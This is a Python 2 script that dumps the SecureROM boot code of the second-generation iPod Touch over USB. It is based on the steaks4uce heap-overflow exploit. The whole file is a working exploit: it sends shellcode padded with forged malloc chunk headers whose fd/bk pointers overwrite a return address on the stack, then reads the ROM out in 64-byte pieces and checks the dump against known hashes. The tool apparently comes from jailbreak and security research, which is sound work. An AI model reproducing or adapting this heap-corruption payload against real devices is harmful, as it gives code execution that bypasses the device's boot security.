#!/usr/bin/python
# S5L8720 - iPod Touch (2nd generation) - SecureROM dumper
# based on steaks4uce exploit by pod2g
# Author: axi0mX

import hashlib, struct, sys
import usb # pyusb: use 'pip install pyusb' to install this module

class DeviceConfig:
  def __init__(self, version, buffer_addr, sha256):
    self.version = version
    self.buffer_addr = buffer_addr
    self.sha256 = sha256

configs = [
  DeviceConfig('240.4',   0x22026340, '55f4d8ea2791ba51dd89934168f38f0fb21ce8762ff614c1e742407c0d3ca054'),
  DeviceConfig('240.5.1', 0x22026380, 'f15ae522dc9e645fcf997f6cec978ed3ce1811915e84938c68203fb95d80d300'),
]

CPID_STRING = 'CPID:8720'
SRTG_FORMAT = 'SRTG:[iBoot-%s]'
SECUREROM_SIZE = 0x10000
FILENAME_FORMAT = 'SecureROM-%s-RELEASE.dump'
BUFFER_ADDR_PLACEHOLDER = 0xDEADDEAD
INDEX_PLACEHOLDER = 0xBAADBAAD

f = open('bin/shellcode.bin', 'rb')
shellcode = f.read()
f.close()

def create_payload(buffer_addr, index):
  assert len(shellcode) <= 256
  # Make sure placeholder values are in the right place
  assert shellcode[-8:] == struct.pack('<2I', BUFFER_ADDR_PLACEHOLDER, INDEX_PLACEHOLDER)

  # Replace buffer_addr and index placeholder values
  payload = shellcode[:-8] + struct.pack('<2I', buffer_addr, index)

  # Pad to length 256 and add heap data
  payload += '\x00' * (256 - len(payload)) + struct.pack('<14I',
                # freed buffer - malloc chunk header: (size 0x8)
          0x84, # 0x00: previous_chunk
           0x5, # 0x04: next_chunk
                # freed buffer - contents: (requested size 0x1C, allocated size 0x20)
          0x80, # 0x08: buffer[0] - direction
    0x22026280, # 0x0c: buffer[1] - usb_response_buffer
    0xFFFFFFFF, # 0x10: buffer[2]
         0x138, # 0x14: buffer[3] - size of payload in bytes
         0x100, # 0x18: buffer[4]
           0x0, # 0x1c: buffer[5]
           0x0, # 0x20: buffer[6]
           0x0, # 0x24: unused
                # next chunk - malloc chunk header: (size 0x8)
          0x15, # 0x28: previous_chunk
           0x2, # 0x2c: next_chunk
                # attack fd/bk pointers in this free malloc chunk for arbitrary write:
    0x22000001, # 0x30: fd: shellcode address (what to write)
    0x2202D7FC, # 0x34: bk: exception_irq() LR on the stack (where to write it)
  )

  return payload

if __name__ == '__main__':
  print '*** S5L8720 - iPod Touch (2nd generation) - SecureROM dumper by axi0mX ***'
  print '*** based on steaks4uce exploit (heap overflow) by pod2g ***'
  print 'Make sure an S5L8720 device in SecureROM DFU Mode is connected.'

  device = usb.core.find(idVendor=0x5AC, idProduct=0x1227)
  if device is None:
    print 'ERROR: No Apple device in DFU Mode (0x1227) detected. Exiting.'
    sys.exit(1)

  print 'Found:', device.serial_number
  if CPID_STRING not in device.serial_number:
    print 'ERROR: This is not a compatible device. This tool is for S5L8720 devices only. Exiting.'
    sys.exit(1)

  chosenConfig = None
  for config in configs:
    if SRTG_FORMAT % config.version in device.serial_number:
      chosenConfig = config
      break
  if chosenConfig is None:
    print 'ERROR: CPID is compatible, but serial number string does not match.'
    print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
    sys.exit(1)
  
  print 'Dumping SecureROM.'

  dump = str()
  for index in range(0, SECUREROM_SIZE, 64):
    assert device.ctrl_transfer(0x21, 4, 0, 0, 0, 100) == 0
    payload = create_payload(chosenConfig.buffer_addr, index)
    assert device.ctrl_transfer(0x21, 1, 0, 0, payload, 100) == len(payload)
    assert len(device.ctrl_transfer(0xA1, 1, 0, 0, len(payload), 100)) == len(payload)
    received = device.ctrl_transfer(0xA1, 1, 0, 0, 256, 100)
    assert len(received) == 256
    dump += received[192:].tostring()
  usb.util.dispose_resources(device)

  filename = FILENAME_FORMAT % chosenConfig.version
  if hashlib.sha256(dump).hexdigest() == chosenConfig.sha256:
    print 'SUCCESS: SecureROM dump is complete and SHA256 hash matches the expected value.'
  else:
    filename = 'CORRUPTED-' + filename
    print 'ERROR: Try again, this dump appears to be corrupted. SHA256 hash does not match. Saving it anyway.'
  
  f = open(filename, 'wb')
  f.write(dump)
  f.close()
  
  print 'Saved to file:', filename
